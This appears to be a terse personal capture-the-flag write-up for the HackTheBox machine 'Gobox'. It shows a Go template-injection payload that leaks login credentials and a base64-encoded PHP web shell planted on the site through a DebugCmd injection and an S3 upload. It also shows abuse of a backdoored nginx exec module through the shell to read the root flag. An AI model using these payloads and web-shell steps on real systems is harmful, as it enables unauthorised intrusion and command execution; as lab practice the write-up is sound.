we use next payload in directories /forgot on 8080 port
email={{.Email}} and email={{.Password}}
ippsec@hacking.esports:ippsSecretPassword

after login we found exec command in source code of server:
![[Pasted image 20250204212954.png]]

echo "<?php system(\$_REQUEST['cmd']); ?>" | base64
PD9waHAgc3lzdGVtKCRfUkVRVUVTVFsnY21kJ10pOyA/Pgo=
{ .DebugCmd "echo -n PD9waHAgc3lzdGVtKCRfUkVRVUVTVFsnY21kJ10pOyA/Pgo= | base64 -d /tmp/shell.php"}
{ .DebugCmd "aws s3 cp /tmp/shell.php s3://website/shell.php"}

then in http://gobox.htb/shell.php?cmd=ls+/etc/nginx we found conf file 50-backdoor.conf with exec module /usr/lib/nginx/modules/ngx_http_execute_module.so
![[Pasted image 20250204230133.png]]

https://github.com/limithit/NginxExecute?tab=readme-ov-file

in this module we found command that give for us system command
view-source:http://gobox.htb/shell.php?cmd=strings+/usr/share/nginx/modules/ngx_http_execute_module.so+|+grep+run
![[Pasted image 20250204230011.png]]
and we use this command 
view-source:http://gobox.htb/shell.php?cmd=curl+-g+http://127.0.0.1:8000/?ippsec.run[%22cat+/root/root.txt%22]